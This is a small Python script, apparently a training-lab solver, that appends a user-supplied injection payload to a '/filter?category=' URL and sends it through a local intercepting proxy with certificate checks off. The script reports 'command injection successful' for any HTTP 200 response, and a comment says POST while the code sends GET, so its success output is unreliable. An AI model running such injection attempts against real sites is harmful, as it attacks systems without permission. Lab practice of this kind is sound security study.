import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, command):
    path = '/filter?category='
    payload=command
    
    
    try:
        # Make a POST request to the target URL with the command injection payload
        print(url + path + payload)
        r = requests.get(url + path + payload, verify=False, proxies=proxies)
        #print(r)
        
        if r.status_code == 200:
            
            print("(+) Command injection successful!")
            print("(+) Congratulations, you solved the lab! " )
            
        else:
            print("(-) Request failed with status code: %d" % r.status_code)
    except requests.exceptions.RequestException as e:
        print("(-) An error occurred: %s" % str(e))

def main():
    # Prompt the user for input
    url = input()
    command = input()
    
    print("(+) Exploiting command injection...")
    run_command(url, command)

if __name__ == "__main__":
    main() 
